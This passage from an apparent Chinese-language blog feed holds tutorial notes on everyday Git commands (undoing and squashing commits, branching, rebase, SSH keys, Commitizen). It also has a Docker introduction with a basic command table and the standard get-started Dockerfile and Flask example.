记录每次更新到仓库"></a>2.2 记录每次更新到仓库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ git status</span><br><span class="line">$ git diff --cached</span><br><span class="line">$ git add </span><br><span class="line">$ git commit -m &quot;description&quot;</span><br><span class="line">$ git log // 查看提交历史</span><br></pre></td></tr></table></figure><h4 id="2-3-撤销操作"><a href="#2-3-撤销操作" class="headerlink" title="2.3 撤销操作"></a>2.3 撤销操作</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// 发现漏了几个文件没有添加，或提交信息写错，尝试重新提交</span><br><span class="line">$ git commit -m &apos;initial commit&apos;</span><br><span class="line">$ git add forgotten_file</span><br><span class="line">$ git commit --amend</span><br><span class="line"></span><br><span class="line">// 取消暂存的文件，意外输入git add *，如何取消暂存两个中的一个</span><br><span class="line">$ git add *</span><br><span class="line">$ git reset HEAD &lt;file&gt;</span><br><span class="line"></span><br><span class="line">// 撤销对文件的修改，将文件还原成上一次提交时的样子</span><br><span class="line">$ git checkout -- &lt;file&gt;</span><br></pre></td></tr></table></figure><h4 id="2-4-远程仓库的使用"><a href="#2-4-远程仓库的使用" class="headerlink" title="2.4 远程仓库的使用"></a>2.4 远程仓库的使用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ git remote -v</span><br><span class="line">$ git remote add &lt;shortname&gt; &lt;url&gt;</span><br><span class="line">$ git fetch [remote-name] [branch-name]</span><br><span class="line">$ git push [remote-name] [branch-name]</span><br><span class="line">$ git remote rename [old-name] [new-name]</span><br><span class="line">$ git remote rm [remote-name]</span><br></pre></td></tr></table></figure><p><br></p><h3 id="3-Git分支"><a href="#3-Git分支" class="headerlink" title="3. Git分支"></a>3. Git分支</h3><h4 id="3-1-分支命令"><a href="#3-1-分支命令" class="headerlink" title="3.1 分支命令"></a>3.1 分支命令</h4><p>Git的分支，其实本质上仅仅是指向提交对象的可变指针。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ git branch -v</span><br><span class="line"></span><br><span class="line">// 新建一个分支，并切换到那个分支上</span><br><span class="line">$ git branch testing</span><br><span class="line">$ git checkout testing </span><br><span class="line">($ git checkout -b testing)</span><br><span class="line"></span><br><span class="line">// 合并分支遇到冲突，解决冲突后，对每个文件使用git add命令将其标记为冲突已解决。</span><br><span class="line">$ git merge master --no-ff</span><br><span class="line"></span><br><span class="line">&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD:index.html</span><br><span class="line">&lt;div id=&quot;footer&quot;&gt;contact : email.support@github.com&lt;/div&gt;</span><br><span class="line">=======</span><br><span class="line">&lt;div id=&quot;footer&quot;&gt;</span><br><span class="line">please contact us at support@github.com</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&gt;&gt;&gt;&gt;&gt;&gt;&gt; iss53:index.html</span><br><span class="line"></span><br><span class="line">// 删除分支</span><br><span class="line">$ git branch -d testing</span><br></pre></td></tr></table></figure></p><h4 id="3-2-fetch-与-pull"><a href="#3-2-fetch-与-pull" class="headerlink" title="3.2 fetch 与 pull"></a>3.2 fetch 与 pull</h4><p>当<code>git fetch</code>命令从服务器上抓取本地没有的数据时，它并不会修改工作目录中的内容。它只会获取数据然后让你自己合并。<code>git pull</code>在大多数情况下是一个<code>git fetch</code>紧接着一个<code>git merge</code>命令。</p><h4 id="3-3-git工作流程最佳实践"><a href="#3-3-git工作流程最佳实践" class="headerlink" title="3.3 git工作流程最佳实践"></a>3.3 git工作流程最佳实践</h4><p>Git Flow模型中定义了主分支和辅助分支两类分支。其中主分支用于组织与软件开发，部署相关的活动；辅助分支为了解决特定的问题而进行的各种开发活动。<a href="https://blog.csdn.net/Eacter/article/details/78552607" target="_blank" rel="noopener">具体查看</a></p><ul><li>主分支：master / develop</li><li>辅助分支： feature / release / hotfix<br><img src="/2018/09/13/Git笔记/1.png" style="padding-top:20px"></li></ul><h4 id="3-4-变基与合并"><a href="#3-4-变基与合并" class="headerlink" title="3.4 变基与合并"></a>3.4 变基与合并</h4><ul><li>合并(Merge): 它会把两个分支的最新快照(C3 和 C4)以及两者的共同祖先(C2)进行三方合并，合并的结果是生成一个新的快照(并提交)。<br><img src="/2018/09/13/Git笔记/2.png" style="padding-top:20px"></li></ul><p><br></p><ul><li>变基(Rebase): 提取在C4中引入的补丁和修改，然后再C3的基础上应用一次。<br><strong>变基的风险</strong>: 变基操作的实质是丢弃一些现有的提交，然后相应地新建一些内容一样但实际上不同的提交。如果你已经将提交推送至某个仓库，而其他人也已经从该仓库拉取提交并进行了后续工作，此时，你用 git rebase 命令重新整理了提交并再次推送，你的同伴因此将不得不再次将他们手头的工作与你的提交进行整合，如果接下来你还要拉取并整合他们修改过的提交，事情就会变得一团糟。总的原则是，不要对在你的仓库外有副本的分支执行变基。<br><img src="/2018/09/13/Git笔记/3.png" style="padding-top:20px"></li></ul><p><br></p><h3 id="4-其他"><a href="#4-其他" class="headerlink" title="4. 其他"></a>4. 其他</h3><h4 id="4-1-生成SSH公钥"><a href="#4-1-生成SSH公钥" class="headerlink" title="4.1 生成SSH公钥"></a>4.1 生成SSH公钥</h4><p>默认情况下，用户的SSH密钥存储在其 ~/.ssh 目录下。我们需要寻找一对以id_dsa或id_ras命名的文件，其中一个带有.pub扩展名，.pub文件是你的公钥，另一个则是私钥。</p><p>如果找不到这样的文件，你可以运行ssh-keygen程序来创建它们。ssh-keygen会确认密钥的存储位置，然后它会要求你输入两次密钥口令。如果你不想在使用密钥时输入口令，将其留空即可。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ cd ~/.ssh</span><br><span class="line">$ ls</span><br><span class="line">authorized_keys2  id_dsa       known_hosts</span><br><span class="line">config            id_dsa.pub</span><br><span class="line">$ ssh-keygen</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="4-2-暂存文件"><a href="#4-2-暂存文件" class="headerlink" title="4.2 暂存文件"></a>4.2 暂存文件</h4><p>将当前工作区的修改暂存起来，stash后，可以将其重新应用到当前工作区。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git stash</span><br><span class="line">$ git stash apply</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="4-3-撤销错误commit"><a href="#4-3-撤销错误commit" class="headerlink" title="4.3 撤销错误commit"></a>4.3 撤销错误commit</h4><ul><li><p>错误commit后，仅撤销commit, 暂存区、工作内容不变<br><em>注意: commit-id为错误commit之前的commit-id</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git log</span><br><span class="line">$ git reset --soft commit-id</span><br></pre></td></tr></table></figure></li><li><p>错误commit后，撤销commit和add， 工作内容不变</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git log</span><br><span class="line">$ git reset --mixed commit-id</span><br><span class="line">// 该命令相当于恢复到git add 之前的状态，同时工作区的内容不变</span><br></pre></td></tr></table></figure></li><li><p>错误commit后，想恢复到某个版本库的代码（暂存区、工作区均改变）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git log</span><br><span class="line">$ git reset --hard commit-id</span><br></pre></td></tr></table></figure></li><li><p>撤销已经push至远端仓库的commit<br>撤回后直接push, 会报错。 因为本地项目版本号低于远端仓库版本号。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">error: failed to push some refs to &apos;https://github.com/ufresh2013/elite-wagtail.git&apos;</span><br><span class="line">hint: Updates were rejected because the tip of your current branch is behind</span><br><span class="line">hint: its remote counterpart. Integrate the remote changes (e.g.</span><br><span class="line">hint: &apos;git pull ...&apos;) before pushing again.</span><br></pre></td></tr></table></figure></li></ul><p>这时，可以添加参数<code>force</code>强制提交， 达到撤销远端版本号的目的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git log</span><br><span class="line">git reset --mixed commit-id</span><br><span class="line">git push origin master --force // 强制提交当前版本号，撤销远端错误commit</span><br><span class="line"></span><br><span class="line">// 重新提交</span><br><span class="line">git add</span><br><span class="line">git commit</span><br><span class="line">git push</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="4-4-合并commit"><a href="#4-4-合并commit" class="headerlink" title="4.4 合并commit"></a>4.4 合并commit</h4><p>通过变基，可以将一连串提交压缩成一个单独的提交。<br>假设已经存在3个commit<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git log</span><br><span class="line">commit commitId3   add line 3</span><br><span class="line">commit commitId2   add line 2</span><br><span class="line">commit commitId1   add line 1</span><br></pre></td></tr></table></figure></p><p>现在我们需要把add line 2, add line 3这两个commit合并成一个commit。pick会执行这个commit, squash会把这个commit合并到前一个commit。<code>wq</code>保存后，会继续跳到commit message。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">git rebase -i commitId1</span><br><span class="line"></span><br><span class="line">pick commitId2 add line 2</span><br><span class="line">squash commitId3 add line 3</span><br><span class="line">#</span><br><span class="line"># Commands:</span><br><span class="line">#  p, pick = use commit</span><br><span class="line">#  r, reword = use commit, but edit the commit message</span><br><span class="line">#  e, edit = use commit, but stop for amending</span><br><span class="line">#  s, squash = use commit, but meld into previous commit</span><br><span class="line">#  f, fixup = like &quot;squash&quot;, but discard this commit&apos;s log message</span><br><span class="line">#  x, exec = run command (the rest of the line) using shell</span><br><span class="line">#</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="4-5-拆分commit"><a href="#4-5-拆分commit" class="headerlink" title="4.5 拆分commit"></a>4.5 拆分commit</h4><p>拆分一个提交会撤销这个提交，然后多次地部分第暂存与提交知道完成你所需次数的提交。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git reset HEAD^</span><br><span class="line">实际上将会撤销那次提交并将修改的文件未暂存</span><br></pre></td></tr></table></figure></p><ul><li>从每一个提交移除一个文件: 有人粗心地通过<code>git add .</code> 提交了一个巨大的二进制文件，你想要从所有地方删除它。可能偶然提交了一个包含密码的文件，然而你想开源项目。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git filter-branch --tree-filter &apos;rm -f passwords.txt&apos; HEAD</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="4-6-Git钩子"><a href="#4-6-Git钩子" class="headerlink" title="4.6 Git钩子"></a>4.6 Git钩子</h4><p>Git 能在特定的重要动作发生时触发自定义脚本。客户端钩子由诸如提交和合并这样的操作所调用，而服务器端钩子作用于诸如接收被推送的提交这样的联网操作。<br><br></p><h4 id="4-7-Github-Pages"><a href="#4-7-Github-Pages" class="headerlink" title="4.7 Github Pages"></a>4.7 Github Pages</h4><ul><li>Create a repository.</li><li>Go to the folder where you want to store your project, and clone the new repository<br><code>git clone https://github.com/username/username.github.io</code></li><li>Enter the project folder and add an index.html file<br><code>echo &quot;hello world&quot; &gt; index.html</code></li><li>Add, commit, and push your changes</li><li>Fire up a broswer and go to <a href="http://username.github.io" target="_blank" rel="noopener">http://username.github.io</a></li></ul><p><br><br><br></p><h3 id="5-Commitizen规范提交信息"><a href="#5-Commitizen规范提交信息" class="headerlink" title="5. Commitizen规范提交信息"></a>5. Commitizen规范提交信息</h3><p>commitizen是AngularJS项目中用到的Git Commit Guidelines。用来规范commit信息，遵循一定的范式，便于日后追踪问题。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 全局安装commitizen</span><br><span class="line">npm install -g commitizen</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 在项目目录里，运行下面命令，使其支持angular的commite message格式</span><br><span class="line">commitizen init cz-conventional-changelog --save --save-exact</span><br></pre></td></tr></table></figure><p>凡是用到git commit命令，一律改为使用git cz，就会出现选项，用来生成符合格式的commit message</p><p><img src="/2018/09/13/Git笔记/4.png" style="max-width: 500px"></p><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://git-scm.com/book/zh/v2" target="_blank" rel="noopener">Git官方文档</a></li><li><a href="https://blog.csdn.net/Eacter/article/details/78552607" target="_blank" rel="noopener">Git工作流程最佳实践–git flow</a></li><li><a href="https://blog.csdn.net/hanchao5272/article/details/79435730" target="_blank" rel="noopener">Git撤销已经推送(push)至远端仓库的提交(commit)信息</a></li><li><a href="https://www.jianshu.com/p/201bd81e7dc9?utm_source=oschina-app" target="_blank" rel="noopener">git commit 规范指南</a></li><li><a href="https://www.cnblogs.com/imzhi/p/solution-to-git-checkout-error-tips.html" target="_blank" rel="noopener">https://www.cnblogs.com/imzhi/p/solution-to-git-checkout-error-tips.html</a></li><li><a href="https://blog.csdn.net/u012117723/article/details/52954721/" target="_blank" rel="noopener">https://blog.csdn.net/u012117723/article/details/52954721/</a></li><li><a href="https://www.cnblogs.com/jiaoshou/p/11218526.html" target="_blank" rel="noopener">https://www.cnblogs.com/jiaoshou/p/11218526.html</a></li></ul>]]></content>
      
      <categories>
          
          <category> Basic </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Docker基本概念与操作</title>
      <link href="/2018/09/08/Docker%E5%85%A5%E9%97%A8/"/>
      <url>/2018/09/08/Docker%E5%85%A5%E9%97%A8/</url>
      <content type="html"><![CDATA[<h3 id="1-Docker是什么？"><a href="#1-Docker是什么？" class="headerlink" title="1. Docker是什么？"></a>1. Docker是什么？</h3><p>Docker是一个虚拟环境容器，可以将你的开发环境、代码、配置文件等一并打包到这个容器中，并发布和应用到任意平台中。比如，你在本地用Python开发网站后台，开发测试完成后，就可以将Python3及其依赖包、Flask及其各种插件、Mysql、Nginx等打包到一个容器中，然后部署到任意你想部署到的环境。</p><p>Docker is an open platform for developing, shipping, and running applications. Docker enables you to separate your applications from your infrastructure so you can deliver software quickly.</p><p><br></p><h3 id="2-Docker-Engine"><a href="#2-Docker-Engine" class="headerlink" title="2. Docker Engine"></a>2. Docker Engine</h3><p>最核心的是Docker Daemon，称之为Docker守护进程，也就是server端。Sever端与客户端通过REST API 进行通信。客户端提供一个只读的镜像，通过镜像可以创建一个或多个容器，容器在docker client中只是一个进程，两个进程是互不可见的。</p><p>The Cli uses the Docker REST API to control or interact with the Docker daemon through scripting or direct CLI commands. The daemon creates and manages Docker objects, such as images, container, networks and wolumes.<br><img src="/2018/09/08/Docker入门/1.jpeg" style="padding-top:20px; max-width: 380px"></p><p><br></p><h3 id="3-Docker架构与基本概念"><a href="#3-Docker架构与基本概念" class="headerlink" title="3. Docker架构与基本概念"></a>3. Docker架构与基本概念</h3><p>镜像是Docker生命周期中的构建或打包阶段，而容器则是启动或执行阶段。</p><p>A container is launched by running an image. An image is an executable package that includes everything needed to run an application – the code, a runtime, libraries, environment variables, and configuration files.<br><img src="/2018/09/08/Docker入门/2.jpeg" style="padding-top:20px"></p><p><br></p><h4 id="3-1-镜像-Docker-Image"><a href="#3-1-镜像-Docker-Image" class="headerlink" title="3.1 镜像(Docker Image)"></a>3.1 镜像(Docker Image)</h4><p>An image is a read-only template with instructions for creating a Docker container.</p><p>镜像是一种层式结构。由一系列指令一步步构建出来：执行一条命令，添加文件或文件夹，创建环境变量，容器启动时-运行什么环境。<br>当用户修改一个Docker Image的时候（比如更新应用程序）一个新的层就会被建立。因此，这是一种增量式的修改，而不是新建一个全新的Image，这也是区别于传统虚拟机的一点。当你发布一个新的Image时，你只需要发布差异的部分，因此速度就非常快。<br><img src="/2018/09/08/Docker入门/3.jpeg" style="padding-top:20px; max-width:300px"></p><p><br></p><h4 id="3-2-容器（Container）"><a href="#3-2-容器（Container）" class="headerlink" title="3.2 容器（Container）"></a>3.2 容器（Container）</h4><p>A container is a runnable instance of an image.</p><p>Docker在文件系统内部用这个镜像创建了一个新容器。该容器拥有自己的网络、IP地址，以及一个用来和宿主机进行通信的桥接网络接口。</p><p>打个比方，你首先下载了一个Ubuntu的镜像，然后又安装了mysql和Django应用及依赖，来完成对Ubutun镜像的修改，生成了一个应用镜像。然后，你把这个镜像分享给大家使用，大家通过这个镜像生成了一个容器，容器启动后就会运行Django服务。</p><p><br></p><h4 id="3-3-仓库（Docker-Repository）"><a href="#3-3-仓库（Docker-Repository）" class="headerlink" title="3.3 仓库（Docker Repository）"></a>3.3 仓库（Docker Repository）</h4><p>Docker用来存放镜像的。共有仓库docker hub提供了非常多的镜像文件，这些镜像直接拉取下来就可以运行了，你也可以上传自己的镜像到docker hub上，搭建私有仓库。</p><ul><li>开发构建镜像并将镜像push到docker仓库</li><li>测试或者运维从docker仓库拷贝一份镜像到本地</li><li>通过镜像文件开启docker容器并提供服务<br><img src="/2018/09/08/Docker入门/4.jpeg" style="padding-top:20px"></li></ul><p><br></p><h3 id="4-怎么用Docker完成持续集成、自动交付、自动部署？"><a href="#4-怎么用Docker完成持续集成、自动交付、自动部署？" class="headerlink" title="4. 怎么用Docker完成持续集成、自动交付、自动部署？"></a>4. 怎么用Docker完成持续集成、自动交付、自动部署？</h3><p>搭建一个完整的自动化流程还需要github+Jenkins+registry三样帮助。</p><ul><li>开发人员推送代码到git，git服务器通过hook通知jenkis</li><li>jenkins克隆git代码到本地，并通过dockerFile文件进行编译</li><li>打包生成一个新版本的镜像并推送到仓库，删除当前容器，通过新版本镜像重新运行。<br>开发只需git add *, git commit -m “”, git push即可完成持续集成、自动交付、自动部署。<br><img src="/2018/09/08/Docker入门/5.jpeg" style="padding-top:20px"></li></ul><p><br></p><h3 id="5-Docker基本命令"><a href="#5-Docker基本命令" class="headerlink" title="5. Docker基本命令"></a>5. Docker基本命令</h3><table><thead><tr><th>镜像的操作</th><th style="text-align:center"></th></tr></thead><tbody><tr><td>$ docker search centos</td><td style="text-align:center">查看镜像是否存在</td></tr><tr><td>$ docker pull centos</td><td style="text-align:center">获取镜像</td></tr><tr><td>$ docker build</td><td style="text-align:center">创建镜像（利用Dockerfile）</td></tr><tr><td>$ docker images ls</td><td style="text-align:center">查看镜像</td></tr><tr><td>$ docker commit</td><td style="text-align:center">将容器转化为一个镜像</td></tr><tr><td>$ docker rmi image_name/image_id</td><td style="text-align:center">删除镜像</td></tr><tr><td>容器的操作</td><td style="text-align:center"></td></tr><tr><td>$ docker run</td><td style="text-align:center">基于镜像启动容器</td></tr><tr><td>$ docker container ls</td><td style="text-align:center">查看容器</td></tr><tr><td>$ docker start container_name/container_id</td><td style="text-align:center">启动容器</td></tr><tr><td>$ docker stop container_name/container_id</td><td style="text-align:center">停止容器</td></tr><tr><td>$ docker restart container_name/container_id</td><td style="text-align:center">重启容器</td></tr><tr><td>$ docker rm container_name/container_id</td><td style="text-align:center">删除容器</td></tr><tr><td>$ docker exec -it container-id /bin/bash</td><td style="text-align:center">进入容器</td></tr><tr><td>仓库的操作</td><td style="text-align:center"></td></tr><tr><td>$ docker login</td><td style="text-align:center">登录Dockerhub</td></tr><tr><td>$ docker push xianhu/centos:git</td><td style="text-align:center">将本地的镜像推送到Dockerhub</td></tr><tr><td>$ docker pull xianhu/centos:git</td><td style="text-align:center">从你的仓库中下载镜像</td></tr></tbody></table><p><br></p><h3 id="6-操作示例"><a href="#6-操作示例" class="headerlink" title="6. 操作示例"></a>6. 操作示例</h3><p><a href="https://docs.docker.com/get-started" target="_blank" rel="noopener">https://docs.docker.com/get-started</a></p><h4 id="5-1-Orientation-Set-up-your-Docker-environment"><a href="#5-1-Orientation-Set-up-your-Docker-environment" class="headerlink" title="5.1 Orientation (Set up your Docker environment)"></a>5.1 Orientation (Set up your Docker environment)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># Display docker version and info</span><br><span class="line">docker –version</span><br><span class="line">docker info</span><br><span class="line"></span><br><span class="line"># Execute Docker image</span><br><span class="line">docker run hello-world</span><br><span class="line"></span><br><span class="line"># list Docker images</span><br><span class="line">docker image ls</span><br><span class="line"></span><br><span class="line"># list Docker containers </span><br><span class="line">docker container ls</span><br></pre></td></tr></table></figure><h4 id="5-2-Containers-Build-an-image-and-run-it-as-one-container"><a href="#5-2-Containers-Build-an-image-and-run-it-as-one-container" class="headerlink" title="5.2  Containers(Build an image and run it as one container)"></a>5.2  Containers(Build an image and run it as one container)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"># Create an empty directory. Cd into the new directory, create a file call Dockerfile.</span><br><span class="line">mkdir docker-test</span><br><span class="line">cd docker-test</span><br><span class="line">touch Dockerfile</span><br><span class="line">vim Dockerfile</span><br><span class="line"></span><br><span class="line"># copy-and-paste the follow content into the Dockerfile</span><br><span class="line">  # Use an official Python runtime as a parent image</span><br><span class="line">  FROM python:2.7-slim</span><br><span class="line"></span><br><span class="line">  # Set the working directory to /app</span><br><span class="line">  WORKDIR /app</span><br><span class="line"></span><br><span class="line">  # Copy the current directory contents into the container at /app</span><br><span class="line">  ADD . /app</span><br><span class="line"></span><br><span class="line">  # Install any needed packages specified in requirements.txt</span><br><span class="line">  RUN pip install --trusted-host pypi.python.org -r requirements.txt</span><br><span class="line"></span><br><span class="line">  # Make port 80 available to the world outside this container</span><br><span class="line">  EXPOSE 80</span><br><span class="line"></span><br><span class="line">  # Define environment variable</span><br><span class="line">  ENV NAME World</span><br><span class="line"></span><br><span class="line">  # Run app.py when the container launches</span><br><span class="line">  CMD [&quot;python&quot;, &quot;app.py&quot;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># create two more files, requirements.txt and app.py.</span><br><span class="line">requirements.txt</span><br><span class="line">  Flask</span><br><span class="line">  Redis</span><br><span class="line"></span><br><span class="line">app.py</span><br><span class="line">  from flask import Flask</span><br><span class="line">  from redis import Redis, RedisError</span><br><span class="line">  import os</span><br><span class="line">  import socket</span><br><span class="line"></span><br><span class="line">  # Connect to Redis</span><br><span class="line">  redis = Redis(host=&quot;redis&quot;, db=0, socket_connect_timeout=2, socket_timeout=2)</span><br><span class="line"></span><br><span class="line">  app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">  @app.route(&quot;/&quot;)</span><br><span class="line">  def hello():</span><br><span class="line">      try:</span><br><span class="line">          visits = redis.incr(&quot;counter&quot;)</span><br><span class="line">      except RedisError:</span><br><span class="line">          visits = &quot;&lt;i&gt;cannot connect to Redis, counter disabled&lt;/i&gt;&quot;</span><br><span class="line"></span><br><span class="line">      html = &quot;&lt;h3&gt;Hello &#123;name&#125;!&lt;/h3&gt;&quot; \</span><br><span class="line">              &quot;&lt;b&gt;Hostname:&lt;/b&gt; &#123;hostname&#125;&lt;br/&gt;&quot; \</span><br><span class="line">              &quot;&lt;b&gt;Visits:&lt;/b&gt; &#123;visits&#125;&quot;</span><br><span class="line">      return html.format(name=os.getenv(&quot;NAME&quot;, &quot;world&quot;), hostname=socket.gethostname(), visits=visits)</span><br><span class="line"></span><br><span class="line">  if __name__ == &quot;__main__&quot;:</span><br><span class="line">      app.run(host=&apos;0.0.0.0&apos;, port=80)</span><br></pre></td></tr></table></figure><h4 id="5-3-Build-and-run-the-app"><a href="#5-3-Build-and-run-the-app" class="headerlink" title="5.3 Build and run the app"></a>5.3 Build and run the app</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># Creates a Docker image</span><br><span class="line">docker build -t friendlyhello .</span><br><span class="line">docker image ls</span><br><span class="line"></span><br><span class="line"># Run the app</span><br><span class="line">docker run -p 4000:80 friendlyhello</span><br><span class="line"></span><br><span class="line"># Run the app in the background, in detached mode:</span><br><span class="line">$ docker run -d -p 4000:80 friendlyhello</span><br><span class="line"></span><br><span class="line">Stop the process with the container id</span><br><span class="line">$ docker container stop 1fa4ab2cf395</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># visit the URL </span><br><span class="line">http://localhost:4000</span><br></pre></td></tr></table></figure><h4 id="5-4-Share-your-image"><a href="#5-4-Share-your-image" class="headerlink" title="5.4 Share your image"></a>5.4 Share your image</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Share your image</span><br><span class="line"># login in with your docker ID</span><br><span class="line">docker login</span><br><span class="line"></span><br><span class="line"># Tag the image</span><br><span class="line">docker tag image username/repository:tag</span><br><span class="line">docker tag friendlyhello ufresh/get-started:part2</span><br><span class="line"></span><br><span class="line"># Publish the image</span><br><span class="line">docker push username/repository:tag</span><br><span class="line"></span><br><span class="line"># Pull and run the image from the remote repository</span><br><span class="line">docker run -p 4000:80 username/repository:tag</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> Work </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Markdown 语法</title>
      <link href="/2017/10/06/Markdown%E8%AF%AD%E6%B3%95/"/>
      <url>/2017/10/06/Markdown%E8%AF%AD%E6%B3%95/</url>
